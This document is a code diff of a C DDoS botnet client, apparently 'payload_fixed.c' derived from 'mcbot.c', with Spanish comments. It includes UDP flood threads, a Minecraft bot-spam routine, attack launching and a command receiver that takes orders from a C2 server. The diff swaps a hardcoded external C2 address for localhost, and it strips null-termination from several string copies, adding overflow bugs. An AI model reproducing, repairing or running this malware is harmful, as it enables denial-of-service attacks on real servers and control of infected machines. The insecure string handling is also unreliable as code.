@@ -3,7 +3,6 @@
  * Compilar: gcc -O2 -pthread -o payload payload_fixed.c -lz -lm -lssl -lcrypto
  * 
  * Basado en mcbot.c, con lógica de spam idéntica y todos los métodos de ataque.
- * Corregido: warnings de fgets, snprintf y strncpy.
  */
 
 #define _GNU_SOURCE
@@ -39,8 +38,8 @@
 #include <openssl/bn.h>
 
 // ─── CONFIGURACIÓN ────────────────────────────────────────────────────────────
-#define C2_ADDRESS "45.13.236.245"
-#define C2_PORT 26110
+#define C2_ADDRESS "127.0.0.1"
+#define C2_PORT 1337
 #define RECONNECT_DELAY 3
 #define MAX_THREADS 8
 #define MAX_ATTACKS 50
@@ -151,7 +150,6 @@ static int rand_range(int lo, int hi) {
 }
 
 // ─── MÉTODOS DE ATAQUE (L4) ──────────────────────────────────────────────────
-
 void *udp_flood_thread(void *arg) {
     Attack *atk = (Attack *)arg;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -662,9 +660,7 @@ static void w_magic_mc(BufMC *b) { w_raw_mc(b, MAGIC_MC, 16); }
 static void w_str_mc(BufMC *b, const char *s) { size_t l = strlen(s); w_u16be_mc(b, (uint16_t)l); w_raw_mc(b, (const uint8_t *)s, l); }
 static void w_std_ip_mc(BufMC *b, const char *ip, uint16_t port) {
     w_u8_mc(b, 4);
-    char tmp[256]; 
-    strncpy(tmp, ip, sizeof(tmp)-1);
-    tmp[sizeof(tmp)-1] = '\0';
+    char tmp[256]; strncpy(tmp, ip, 255);
     char *p = tmp, *tok;
     while ((tok = strsep(&p, "."))) { w_u8_mc(b, atoi(tok) & 0xFF); }
     w_u16be_mc(b, port);
@@ -1722,7 +1718,6 @@ void start_mcbot(const char *ip, int port, const char *nombre, int bots, int tie
         bot->spawned_ok = 0;
         bot->variant_a = 0;
         strncpy(bot->host, ip, sizeof(bot->host)-1);
-        bot->host[sizeof(bot->host)-1] = '\0';
         if (register_cmd) {
             if (register_cmd[0] == '/') {
                 char pass[16];
@@ -1730,7 +1725,6 @@ void start_mcbot(const char *ip, int port, const char *nombre, int bots, int tie
                 snprintf(bot->register_cmd, sizeof(bot->register_cmd), "%s %s", register_cmd, pass);
             } else {
                 strncpy(bot->register_cmd, register_cmd, sizeof(bot->register_cmd)-1);
-                bot->register_cmd[sizeof(bot->register_cmd)-1] = '\0';
             }
         }
         random_name_mc(nombre, bot->nombre, MAX_NOMBRE_LEN);
@@ -1805,15 +1799,12 @@ void start_attack(const char *method, const char *ip, int port, int duration, in
     }
     Attack *atk = malloc(sizeof(Attack));
     memset(atk, 0, sizeof(Attack));
-    strncpy(atk->ip, ip, sizeof(atk->ip)-1);
-    atk->ip[sizeof(atk->ip)-1] = '\0';
+    strncpy(atk->ip, ip, 63);
     atk->port = port;
     atk->duration = duration;
     atk->threads = threads > MAX_THREADS ? MAX_THREADS : threads;
-    strncpy(atk->username, username, sizeof(atk->username)-1);
-    atk->username[sizeof(atk->username)-1] = '\0';
-    strncpy(atk->method, method, sizeof(atk->method)-1);
-    atk->method[sizeof(atk->method)-1] = '\0';
+    strncpy(atk->username, username, 31);
+    strncpy(atk->method, method, 15);
     atk->start_time = time(NULL);
     atk->running = 1;
     attacks[attack_count++] = atk;
@@ -1847,8 +1838,9 @@ void start_attack(const char *method, const char *ip, int port, int duration, in
             pthread_detach(atk->threads_arr[i]);
         }
     }
-    printf(GREEN "[+] Attack started: %s %s:%d (%ds, %d threads) user: %s\n" RESET,
-           method, ip, port, duration, threads, username);
+    char resp[256];
+    snprintf(resp, sizeof(resp), "[+] %s attack started\n", method);
+    printf(GREEN "%s" RESET, resp);
 }
 
 void stop_attacks(const char *username) {
@@ -1887,9 +1879,7 @@ void *c2_receiver(void *arg) {
         int argc = 0;
         char *token = strtok(buffer, " ");
         while (token && argc < MAX_ARGS) {
-            strncpy(args[argc], token, sizeof(args[argc])-1);
-            args[argc][sizeof(args[argc])-1] = '\0';
-            argc++;
+            strcpy(args[argc++], token);
             token = strtok(NULL, " ");
         }
         if (argc == 0) continue;
@@ -1949,19 +1939,18 @@ void *c2_receiver(void *arg) {
 
 int authenticate(int sock) {
     char buffer[BUFFER_SIZE];
-    char arch[32] = "unknown";
+    char arch[32];
     char response[256];
     int bytes;
 
     FILE *fp = popen("uname -m 2>/dev/null", "r");
     if (fp) {
-        if (fgets(arch, sizeof(arch), fp) == NULL) {
-            strcpy(arch, "unknown");
-        }
+        fgets(arch, sizeof(arch), fp);
         arch[strcspn(arch, "\n")] = 0;
         pclose(fp);
+    } else {
+        strcpy(arch, "unknown");
     }
-
     printf(CYAN "[*] Architecture: %s\n" RESET, arch);
 
     memset(buffer, 0, BUFFER_SIZE);
